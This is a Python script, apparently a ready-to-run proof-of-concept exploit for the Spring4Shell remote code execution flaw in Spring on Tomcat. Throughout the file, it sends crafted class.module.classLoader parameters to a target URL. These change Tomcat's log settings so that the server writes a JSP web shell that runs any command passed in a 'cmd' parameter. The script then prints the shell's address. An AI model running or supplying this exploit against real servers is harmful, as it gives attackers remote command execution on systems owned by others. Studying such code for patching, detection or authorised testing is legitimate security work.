import requests
import argparse
from urllib.parse import urlparse
import time

def exploit(url, dir, filename):
    # request post header value
    p_headers = {
        "Content-Type":"application/x-www-form-urlencoded"
    }

    # request get header value
    g_headers = {
        "prefix" : "<%",
        "suffix" : "%>//",
        "c" : "Runtime"
    }

    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={dir}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    # expand log
    data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    
    # Set & Unset the fileDateFormat to run exploit multiple time
    print("... Reset the Log variables ...")
    file_date = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    ret = requests.post(url, headers=p_headers, data=file_date, verify=False)
    print("... Response Code : %d ..." %ret.status_code)

    # Change the tomcat log location variable
    print("... Modify Log Configuration ...")
    ret = requests.post(url, headers=p_headers, data = data, verify=False)
    print("... Response Code : %d ..." %ret.status_code)
    # time to changing
    time.sleep(3)

    # Send a packet to write a web shell
    print("... Send the packet to write a Web Shell ...")
    ret = requests.get(url, headers=g_headers, verify=False)
    print("... Response Code : %d ..." %ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent writes
    pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("... Reset the Log variables ...")
    ret = requests.post(url, headers=p_headers, data=pattern, verify=False)
    print("... Response code : %d ..." % ret.status_code)


def main():
    # Create an instance that can recive value
    parser = argparse.ArgumentParser(description='Spring4Shell RCE')
    # Set the factor value to recive input
    # '--optional argument name'
    # help='description of argument'
    # required=False -> to make optional arguement
    # default="something" -> set the default option to not set None
    parser.add_argument('--file', help='File to write to', required=False, default="shell")
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--dir', help='Directory to write to', required=False, default="webapps/ROOT")
    # Save argument in args & analyze
    args = parser.parse_args()

    # replace the file type .jsp to none
    file = args.file.replace(".jsp", "")

    # if url is none print error message
    if args.url is None:
        print("pass options to --url")
        return

    try:
        # run the exploit function
        exploit(args.url, args.dir, file)
        print("[*] Exploit completed")
        print("[*] File: " + file + ".jsp")

        if args.dir:
            # location = communication protocol + :// + network location + / + file + .jsp
            location = urlparse(args.url).scheme + "://" + urlparse(args.url).netloc + "/" + file + ".jsp"
        else:
            # location = app/file.jsp?cmd=id
            location = f"Use app/{file}.jsp?cmd=id"
        print(f"[*] Shell locate at :{location}?cmd=id")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()